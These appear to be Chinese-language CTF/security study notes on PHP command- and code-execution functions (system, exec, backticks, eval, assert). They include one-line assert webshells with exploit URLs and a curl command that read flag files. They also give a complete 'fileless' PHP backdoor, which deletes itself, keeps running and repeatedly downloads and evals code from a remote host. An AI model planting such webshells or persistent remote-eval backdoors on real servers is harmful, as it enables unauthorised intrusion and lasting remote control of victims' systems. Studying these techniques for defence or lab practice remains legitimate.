### 命令执行函数
system()
```
说明：执行外部程序并显示输出资料。
语法：string system(string command, int [return_var]);
返回值: 字符串
```
exec函数
```
说明：执行外部程序。

语法：string exec(string command, string [array], int [return_var]);

返回值: 字符串
```
反撇号`（和~在同一个键）
```
执行系统外部命令,代码如下:echo `dir`;

知识点：在使用这种方法执行系统外部命令时，你要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。
```



#### 代码执行

eval函数中参数是字符，如：
```
eval('echo 1;');
```
assert函数中参数为表达式 （或者为函数），如：
```
assert(phpinfo()) 
```
这样：`assert(eval('echo 1;'));`，无法执行。

如：
```
<?php assert($_GET[1]);?>

http://172.16.2.234:8011/3.php?1=system(%22cat%20/flag.txt%22)
http://172.16.2.234:8011/3.php?1=print_r(file_get_contents(%22/flag.txt%22))
```

```
<?php assert($_REQUEST[1]);?>

curl "http://172.16.2.234:8011/4.php" -d "1=system('cat /flag*')"
de9d4919ce86aeb38a5332c7d1c4d24a
```
####

### PHP无文件后门：

php常驻内存的问题，想要将远程文件写入本地，并且让文件常驻内存中。
代码构想：
```
unlink($_SERVER['SCRIPT_FILENAME']); // 删除自身
ignore_user_abort(true); // 驻留进程，等待指令
set_time_limit(0); // 不关闭程序，保持连接
```

webshell.php
```
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

$remote_file = 'http://182.168.2.2/file.txt';
while($code = file_get_contents($remote_file)){
  @eval($code);
  sleep(10);
};
?>
```

**`http://182.168.2.2/file.txt`**

```
file_put_contents('index.php','hello world '.time(),FILE_APPEND);
//FILE_APPEND追加写入
```

